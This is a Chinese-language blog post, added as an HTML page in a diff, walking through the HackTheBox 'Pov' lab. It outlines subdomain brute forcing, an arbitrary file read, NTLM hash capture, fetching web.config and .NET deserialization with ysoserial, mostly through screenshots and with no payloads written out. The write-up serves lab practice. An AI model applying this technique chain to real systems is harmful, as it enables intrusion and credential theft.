@@ -1,0 +1,810 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Aurey7">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="端口扫描TCP WEB网页没有发现链接，尝试爆破也没有发现内容。从网页的内容猜测可能存在一个monitor 的子域名。 虚拟主机爆破发现了 dev.pov.htb 任意文件读取Download CV 这里存在任意文件读取漏洞但这里尝试读取 C 盘的内容失败（可能是姿势不对？求大佬指导） 捕获 NTLM Hash 尝试破解失败 .NET 反序列化详细：https:&#x2F;&#x2F;paper.seebug.org">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Pov">
+<meta property="og:url" content="http://aurey7.github.io.git/2024/02/04/Pov/index.html">
+<meta property="og:site_name" content="Aurey7&#39;s Blog">
+<meta property="og:description" content="端口扫描TCP WEB网页没有发现链接，尝试爆破也没有发现内容。从网页的内容猜测可能存在一个monitor 的子域名。 虚拟主机爆破发现了 dev.pov.htb 任意文件读取Download CV 这里存在任意文件读取漏洞但这里尝试读取 C 盘的内容失败（可能是姿势不对？求大佬指导） 捕获 NTLM Hash 尝试破解失败 .NET 反序列化详细：https:&#x2F;&#x2F;paper.seebug.org">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706496858198-9b774d53-d033-471e-b441-1f8e59a6d9d1.png#averageHue=%2315182a&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=553&amp;id=uea13fb07&amp;originHeight=968&amp;originWidth=2000&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=176468&amp;status=done&amp;style=none&amp;taskId=ua838d56c-e90e-48fa-b6b5-a9086da8b51&amp;title=&amp;width=1142.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706497437064-db260d44-0af2-475f-9edf-471ab5f3dffb.png#averageHue=%231e273c&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=773&amp;id=u485bb4cb&amp;originHeight=1364&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=1073865&amp;status=done&amp;style=none&amp;taskId=u2e9919d9-5151-4f46-b961-0c7609ac753&amp;title=&amp;width=1450">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706497672250-154b1ef5-9bc8-48cc-8050-92e6628456dd.png#averageHue=%2315182a&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=342&amp;id=u9367e144&amp;originHeight=599&amp;originWidth=2000&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=97407&amp;status=done&amp;style=none&amp;taskId=u7a1cff5d-044d-4801-920f-ef3ede57d04&amp;title=&amp;width=1142.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503226289-02e2a114-1832-4889-b7a2-924f2ae2f0bd.png#averageHue=%23f5f4f3&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=863&amp;id=u3d654394&amp;originHeight=1510&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=411078&amp;status=done&amp;style=none&amp;taskId=uc0ad331f-5763-4a8b-bd40-4d8fb305dba&amp;title=&amp;width=1462.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503188202-dbe7458d-4bba-4df7-8465-8988d1690185.png#averageHue=%23f5f4f3&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=869&amp;id=u05859b58&amp;originHeight=1520&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=473639&amp;status=done&amp;style=none&amp;taskId=u046bae53-4bbd-44c0-bf40-a75d6289230&amp;title=&amp;width=1462.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503410268-512d4301-4db9-49b5-a706-c9c1d45b4247.png#averageHue=%23f7f5f5&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=866&amp;id=u88122449&amp;originHeight=1516&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=421996&amp;status=done&amp;style=none&amp;taskId=u6ff9425f-803b-41b8-bc2c-843fd13e21b&amp;title=&amp;width=1462.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503922069-5c1b7342-235e-4bdc-afc0-b4d771c61ea1.png#averageHue=%23f7f6f5&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=866&amp;id=u903a9b84&amp;originHeight=1516&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=407783&amp;status=done&amp;style=none&amp;taskId=u0a440c2a-a21f-45b1-bb6d-66477c1604f&amp;title=&amp;width=1462.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503906945-49943db7-0bac-4bc6-93e9-61b3c34e7c76.png#averageHue=%2315182a&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=622&amp;id=u475e5a9d&amp;originHeight=1088&amp;originWidth=1999&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=199564&amp;status=done&amp;style=none&amp;taskId=u1cb81df4-1d7a-4848-9356-9b773a8aed9&amp;title=&amp;width=1142.2857142857142">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706504357606-f955b789-20f1-4db4-9991-5695ab24f162.png#averageHue=%2315182a&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=178&amp;id=u5f612341&amp;originHeight=311&amp;originWidth=2122&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=63139&amp;status=done&amp;style=none&amp;taskId=ub47a0e0e-ee18-4e3a-9801-94d3d9647c3&amp;title=&amp;width=1212.5714285714287">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706507164999-cdffae97-60aa-4f3f-8644-e3e0d82c2d92.png#averageHue=%23f4f3f3&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=866&amp;id=u72b7404d&amp;originHeight=1516&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=494764&amp;status=done&amp;style=none&amp;taskId=uc0d4856d-0c02-4ebf-ad71-c4669d68b1b&amp;title=&amp;width=1462.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706509462860-17a48298-3752-447d-8136-9bb449ac4172.png#averageHue=%23161a2c&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=630&amp;id=ued1726b7&amp;originHeight=1103&amp;originWidth=2336&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=618842&amp;status=done&amp;style=none&amp;taskId=u0bd5dfb6-8392-4b91-94c0-ea28383df6e&amp;title=&amp;width=1334.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706509480796-460817cb-1c43-4def-8932-42033c303bea.png#averageHue=%2315182a&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=450&amp;id=u1a322b09&amp;originHeight=788&amp;originWidth=2336&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=268800&amp;status=done&amp;style=none&amp;taskId=ua87dd13e-d400-4c66-aae9-9ae68b25413&amp;title=&amp;width=1334.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706514747171-c3cdc331-e960-4f9e-baa0-7d6909a07511.png#averageHue=%23f3ecec&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=866&amp;id=uf2de4f46&amp;originHeight=1516&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=797774&amp;status=done&amp;style=none&amp;taskId=u2838d9bf-81bd-4acf-80c2-3f7faffc96d&amp;title=&amp;width=1462.857142857143">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706581792592-43055079-b16a-4250-80a5-7ddc2a3f525d.png#averageHue=%2316192b&amp;clientId=ud4e41c2f-4b01-4&amp;from=paste&amp;height=667&amp;id=ua4d37480&amp;originHeight=1168&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=154071&amp;status=done&amp;style=none&amp;taskId=u2b6b4a60-b24d-4a1f-8f7f-e944090cbaa&amp;title=&amp;width=1255.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706583939883-1019a7c9-178a-430e-aedb-1ea7ed79e604.png#averageHue=%23191c2d&amp;clientId=u31caec9a-5529-4&amp;from=paste&amp;height=591&amp;id=u54d10c80&amp;originHeight=1034&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=301109&amp;status=done&amp;style=none&amp;taskId=uc133facc-4e63-4be9-9dcb-c1e3a294337&amp;title=&amp;width=1255.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706584883330-e88e0b6d-dbf2-46e8-b829-59ae8ab9ae0b.png#averageHue=%2315182a&amp;clientId=u31caec9a-5529-4&amp;from=paste&amp;height=591&amp;id=u3cc62c33&amp;originHeight=1034&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=188019&amp;status=done&amp;style=none&amp;taskId=u3073aadb-a1c5-49c5-909a-3d5298a95d8&amp;title=&amp;width=1255.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706585181135-907dc03f-2dde-4912-beee-a0512c652da4.png#averageHue=%2315182a&amp;clientId=u31caec9a-5529-4&amp;from=paste&amp;height=591&amp;id=ud17e7a0f&amp;originHeight=1034&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=395585&amp;status=done&amp;style=none&amp;taskId=u2830f64a-92a0-40b9-aeed-57cc15e9148&amp;title=&amp;width=1255.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706586083365-3541ce4d-1204-4128-a225-0da12da7cded.png#averageHue=%2315182a&amp;clientId=u31caec9a-5529-4&amp;from=paste&amp;height=363&amp;id=uaa88dd2a&amp;originHeight=636&amp;originWidth=2197&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=119116&amp;status=done&amp;style=none&amp;taskId=u666a9621-39bb-4b27-8e4c-517053519f5&amp;title=&amp;width=1255.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706757692165-5a030438-9111-413d-bb13-8d9c532ed99c.png#averageHue=%2315182a&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=178&amp;id=u566ec731&amp;originHeight=312&amp;originWidth=2211&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=73678&amp;status=done&amp;style=none&amp;taskId=ud5f12c55-7f2e-46ff-acd3-b49078099e9&amp;title=&amp;width=1263.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706757731861-61dd45b4-90bc-4f6f-af59-02a256172213.png#averageHue=%2315182a&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=476&amp;id=u49bcd746&amp;originHeight=833&amp;originWidth=2211&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=129718&amp;status=done&amp;style=none&amp;taskId=ubc47281b-70af-41dd-b1f0-5e9eec733fc&amp;title=&amp;width=1263.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706757895718-c74cf479-db4a-49eb-b58d-6192241e4eb6.png#averageHue=%2315182a&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=630&amp;id=u9ac2bef9&amp;originHeight=1103&amp;originWidth=2211&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=196486&amp;status=done&amp;style=none&amp;taskId=u785191de-ae3b-495f-a165-9ef1816bce7&amp;title=&amp;width=1263.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706758769120-d631176c-894f-43f0-9ff0-7558550671ad.png#averageHue=%23151c2b&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=312&amp;id=ue4039664&amp;originHeight=546&amp;originWidth=2526&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=103072&amp;status=done&amp;style=none&amp;taskId=u9ec9ef60-19b3-4f43-9dda-82cbdee8099&amp;title=&amp;width=1443.4285714285713">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706757991527-52a47a21-13b1-42eb-bc8f-55ed1293f913.png#averageHue=%23192231&amp;clientId=u1a0aa453-1335-4&amp;from=paste&amp;height=779&amp;id=ub5ab4ccb&amp;originHeight=1364&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=732462&amp;status=done&amp;style=none&amp;taskId=ub2a1dff6-089d-4025-8567-de2bd533307&amp;title=&amp;width=1462.857142857143">
+<meta property="article:published_time" content="2024-02-04T04:19:34.000Z">
+<meta property="article:modified_time" content="2024-02-04T04:20:35.021Z">
+<meta property="article:author" content="Aurey7">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706496858198-9b774d53-d033-471e-b441-1f8e59a6d9d1.png#averageHue=%2315182a&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=553&amp;id=uea13fb07&amp;originHeight=968&amp;originWidth=2000&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=176468&amp;status=done&amp;style=none&amp;taskId=ua838d56c-e90e-48fa-b6b5-a9086da8b51&amp;title=&amp;width=1142.857142857143">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackTheBox-Pov - Aurey7&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"aurey7.github.io.git","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Aurey7</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://img.katck.com/images/2023/01/15/b6479d67545b18ee9500ca1d1254eea7.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Pov"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-04 12:19" pubdate>
+          2024年2月4日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Pov</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706496858198-9b774d53-d033-471e-b441-1f8e59a6d9d1.png#averageHue=%2315182a&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=553&amp;id=uea13fb07&amp;originHeight=968&amp;originWidth=2000&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=176468&amp;status=done&amp;style=none&amp;taskId=ua838d56c-e90e-48fa-b6b5-a9086da8b51&amp;title=&amp;width=1142.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><p>网页没有发现链接，尝试爆破也没有发现内容。从网页的内容猜测可能存在一个monitor 的子域名。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706497437064-db260d44-0af2-475f-9edf-471ab5f3dffb.png#averageHue=%231e273c&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=773&amp;id=u485bb4cb&amp;originHeight=1364&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=1073865&amp;status=done&amp;style=none&amp;taskId=u2e9919d9-5151-4f46-b961-0c7609ac753&amp;title=&amp;width=1450" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="虚拟主机爆破"><a href="#虚拟主机爆破" class="headerlink" title="虚拟主机爆破"></a>虚拟主机爆破</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706497672250-154b1ef5-9bc8-48cc-8050-92e6628456dd.png#averageHue=%2315182a&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=342&amp;id=u9367e144&amp;originHeight=599&amp;originWidth=2000&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=97407&amp;status=done&amp;style=none&amp;taskId=u7a1cff5d-044d-4801-920f-ef3ede57d04&amp;title=&amp;width=1142.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"><br>发现了 dev.pov.htb<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503226289-02e2a114-1832-4889-b7a2-924f2ae2f0bd.png#averageHue=%23f5f4f3&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=863&amp;id=u3d654394&amp;originHeight=1510&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=411078&amp;status=done&amp;style=none&amp;taskId=uc0ad331f-5763-4a8b-bd40-4d8fb305dba&amp;title=&amp;width=1462.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>Download CV 这里存在任意文件读取漏洞<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503188202-dbe7458d-4bba-4df7-8465-8988d1690185.png#averageHue=%23f5f4f3&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=869&amp;id=u05859b58&amp;originHeight=1520&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=473639&amp;status=done&amp;style=none&amp;taskId=u046bae53-4bbd-44c0-bf40-a75d6289230&amp;title=&amp;width=1462.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"><br>但这里尝试读取 C 盘的内容失败（可能是姿势不对？求大佬指导）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503410268-512d4301-4db9-49b5-a706-c9c1d45b4247.png#averageHue=%23f7f5f5&amp;clientId=u9a4e4bb9-c306-4&amp;from=paste&amp;height=866&amp;id=u88122449&amp;originHeight=1516&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=421996&amp;status=done&amp;style=none&amp;taskId=u6ff9425f-803b-41b8-bc2c-843fd13e21b&amp;title=&amp;width=1462.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="捕获-NTLM-Hash"><a href="#捕获-NTLM-Hash" class="headerlink" title="捕获 NTLM Hash"></a>捕获 NTLM Hash</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503922069-5c1b7342-235e-4bdc-afc0-b4d771c61ea1.png#averageHue=%23f7f6f5&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=866&amp;id=u903a9b84&amp;originHeight=1516&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=407783&amp;status=done&amp;style=none&amp;taskId=u0a440c2a-a21f-45b1-bb6d-66477c1604f&amp;title=&amp;width=1462.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706503906945-49943db7-0bac-4bc6-93e9-61b3c34e7c76.png#averageHue=%2315182a&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=622&amp;id=u475e5a9d&amp;originHeight=1088&amp;originWidth=1999&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=199564&amp;status=done&amp;style=none&amp;taskId=u1cb81df4-1d7a-4848-9356-9b773a8aed9&amp;title=&amp;width=1142.2857142857142" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="尝试破解"><a href="#尝试破解" class="headerlink" title="尝试破解"></a>尝试破解</h4><p>失败<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706504357606-f955b789-20f1-4db4-9991-5695ab24f162.png#averageHue=%2315182a&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=178&amp;id=u5f612341&amp;originHeight=311&amp;originWidth=2122&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=63139&amp;status=done&amp;style=none&amp;taskId=ub47a0e0e-ee18-4e3a-9801-94d3d9647c3&amp;title=&amp;width=1212.5714285714287" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="NET-反序列化"><a href="#NET-反序列化" class="headerlink" title=".NET 反序列化"></a>.NET 反序列化</h3><p>详细：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1386/">https://paper.seebug.org/1386/</a></p>
+<h4 id="获取-web-config"><a href="#获取-web-config" class="headerlink" title="获取 web.config"></a>获取 web.config</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706507164999-cdffae97-60aa-4f3f-8644-e3e0d82c2d92.png#averageHue=%23f4f3f3&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=866&amp;id=u72b7404d&amp;originHeight=1516&amp;originWidth=2560&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=494764&amp;status=done&amp;style=none&amp;taskId=uc0d4856d-0c02-4ebf-ad71-c4669d68b1b&amp;title=&amp;width=1462.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35578323/1706509462860-17a48298-3752-447d-8136-9bb449ac4172.png#averageHue=%23161a2c&amp;clientId=u370a5314-8ff9-4&amp;from=paste&amp;height=630&amp;id=ued1726b7&amp;originHeight=1103&amp;originWidth=2336&amp;originalType=binary&amp;ratio=1.75&amp;rotation=0&amp;showTitle=false&amp;size=618842&amp;status=done&amp;style=none&amp;taskId=u0bd5dfb6-8392-4b91-94c0-ea28383df6e&amp;title=&amp;width=1334.857142857143" srcset="/img/loading.gif" lazyload alt="image.png"></p>
